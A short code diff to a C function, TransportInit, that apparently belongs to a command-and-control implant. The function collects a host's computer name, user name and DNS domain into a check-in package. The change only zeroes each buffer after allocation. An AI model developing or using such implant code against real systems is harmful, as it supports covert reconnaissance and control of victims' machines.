@@ -80,7 +80,10 @@ BOOL TransportInit( PPACKAGE Package )
     if ( ! Instance->Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &Length ) )
     {
         if ( ( Data = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
+        {
+            MemSet( Data, 0, Length );
             Instance->Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &Length );
+        }
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -88,7 +91,10 @@ BOOL TransportInit( PPACKAGE Package )
     // Get Username
     Length = MAX_PATH;
     if ( ( Data = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
+    {
+        MemSet( Data, 0, Length );
         Instance->Win32.GetUserNameA( Data, &Length );
+    }
 
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -98,7 +104,10 @@ BOOL TransportInit( PPACKAGE Package )
     if ( ! Instance->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
     {
         if ( ( Data = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
+        {
+            MemSet( Data, 0, Length );
             Instance->Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &Length );
+        }
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
